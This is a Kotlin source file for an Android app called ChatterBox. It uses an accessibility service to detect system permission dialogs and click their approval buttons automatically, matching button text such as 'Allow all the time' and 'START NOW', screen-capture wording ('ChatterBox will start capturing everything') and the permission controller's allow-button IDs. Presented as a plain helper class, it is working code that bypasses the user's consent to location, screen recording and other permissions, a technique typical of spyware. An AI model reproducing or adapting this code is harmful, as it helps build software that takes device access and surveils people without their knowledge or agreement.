package com.example.ChatterBox.accessibility

import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.accessibility.AccessibilityNodeInfo

/**
 * Helper class for handling various permission dialogs via accessibility service
 */
class PermissionDialogs(private val accessibilityService: AccessibilityService) {

    private val TAG = "PermissionDialogs"
    private val handler = Handler(Looper.getMainLooper())

    // Flag to control whether this class should process dialogs
    private var isGrantingPermissions = false

    // Pending permissions counter to know when we're done
    private var pendingPermissionsCount = 0

    /**
     * Start permission granting mode with a specific number of expected permissions
     */
    fun startGrantingPermissions(expectedPermissions: Int) {
        pendingPermissionsCount = expectedPermissions
        isGrantingPermissions = true
        Log.d(TAG, "Started permission granting mode, expecting $expectedPermissions permissions")
    }

    /**
     * Stop permission granting mode
     */
    fun stopGrantingPermissions() {
        isGrantingPermissions = false
        pendingPermissionsCount = 0
        Log.d(TAG, "Stopped permission granting mode")
    }

    /**
     * Check if we're currently in permission granting mode
     */
    fun isGrantingPermissions(): Boolean {
        return isGrantingPermissions
    }

    /**
     * Handle permission dialog - only if we're in granting mode
     */
    fun handlePermissionDialog(rootNode: AccessibilityNodeInfo?) {
        if (rootNode == null || !isGrantingPermissions) return

        Log.d(TAG, "Scanning permission dialog")
        dumpNodeTree(rootNode)

        // Try to find permission confirmation text
        val containsPermissionText = containsPermissionText(rootNode)

        if (containsPermissionText) {
            Log.d(TAG, "Permission dialog detected")

            // Try each possible permission button in order of preference
            val buttonTexts = arrayOf(
                "START NOW",
                "WHILE USING THE APP",
                "While using the app",
                "ALLOW",
                "Allow",
                "ALLOW ALL THE TIME",
                "Allow all the time",
                "OK",
                "ONLY THIS TIME",
                "Yes",
                "YES"
            )

            for (buttonText in buttonTexts) {
                val nodes = rootNode.findAccessibilityNodeInfosByText(buttonText)
                for (node in nodes) {
                    if (clickNodeOrParent(node)) {
                        Log.d(TAG, "Clicked permission button: $buttonText")

                        // Decrement pending permissions counter
                        pendingPermissionsCount--
                        Log.d(TAG, "Permissions remaining: $pendingPermissionsCount")

                        // If we've handled all expected permissions, stop granting mode
                        if (pendingPermissionsCount <= 0) {
                            handler.postDelayed({
                                stopGrantingPermissions()
                            }, 1000)
                        }

                        return
                    }
                }
            }

            // Try resource IDs as fallback
            tryClickByResourceId(rootNode)
        }
    }

    /**
     * Check if the dialog contains permission-related text
     */
    private fun containsPermissionText(rootNode: AccessibilityNodeInfo): Boolean {
        val permissionTexts = arrayOf(
            "Allow ChatterBox",
            "permission",
            "would like to",
            "access",
            "Start recording or casting",  // This one is already there
            "Screen capture",  // Add this for media projection dialog
            "starts now",      // Add this for media projection dialog
            "will start capturing",  // Add this for media projection dialog
            "ChatterBox will start capturing everything"  // Add this more specific text
        )

        for (text in permissionTexts) {
            val nodes = rootNode.findAccessibilityNodeInfosByText(text)
            if (nodes.isNotEmpty()) {
                return true
            }
        }

        return false
    }
    /**
     * Try to click buttons using resource IDs
     */
    private fun tryClickByResourceId(rootNode: AccessibilityNodeInfo) {
        val resourceIds = arrayOf(
            "com.android.permissioncontroller:id/permission_allow_foreground_only_button",
            "com.android.permissioncontroller:id/permission_allow_button",
            "com.android.permissioncontroller:id/permission_allow_always_button",
            "android:id/button1"  // Often used for positive buttons in dialogs
        )

        for (resourceId in resourceIds) {
            val node = findNodeByResourceId(rootNode, resourceId)
            if (node != null && clickNodeOrParent(node)) {
                Log.d(TAG, "Clicked button by resource ID: $resourceId")

                // Decrement pending permissions counter
                pendingPermissionsCount--
                Log.d(TAG, "Permissions remaining: $pendingPermissionsCount")

                // If we've handled all expected permissions, stop granting mode
                if (pendingPermissionsCount <= 0) {
                    handler.postDelayed({
                        stopGrantingPermissions()
                    }, 1000)
                }

                return
            }
        }
    }

    /**
     * Try to click a node or its parent if the node itself isn't clickable
     */
    private fun clickNodeOrParent(node: AccessibilityNodeInfo): Boolean {
        // Try direct click first
        if (node.isClickable) {
            val result = node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            return result
        }

        // Try finding a clickable parent
        var current = node.parent
        while (current != null) {
            if (current.isClickable) {
                val result = current.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                if (result) return true
            }
            val temp = current
            current = current.parent
            temp.recycle()
        }

        return false
    }

    /**
     * Find node by resource ID
     */
    private fun findNodeByResourceId(rootNode: AccessibilityNodeInfo, resourceId: String): AccessibilityNodeInfo? {
        // Check if this node has the resource ID
        if (rootNode.viewIdResourceName == resourceId) {
            return rootNode
        }

        // Search all children
        for (i in 0 until rootNode.childCount) {
            val child = rootNode.getChild(i) ?: continue
            val result = findNodeByResourceId(child, resourceId)
            if (result != null) {
                return result
            }
            child.recycle()
        }

        return null
    }

    /**
     * Log node tree for debugging
     */
    private fun dumpNodeTree(node: AccessibilityNodeInfo?, indent: Int = 0) {
        if (node == null) return

        val prefix = " ".repeat(indent)
        Log.d(TAG, "$prefix Node -> " +
                "text: ${node.text}, " +
                "desc: ${node.contentDescription}, " +
                "class: ${node.className}, " +
                "resourceId: ${node.viewIdResourceName}, " +
                "clickable: ${node.isClickable}"
        )

        for (i in 0 until node.childCount) {
            dumpNodeTree(node.getChild(i), indent + 2)
        }
    }

    /**
     * Clean up resources
     */
    fun cleanup() {
        handler.removeCallbacksAndMessages(null)
    }
}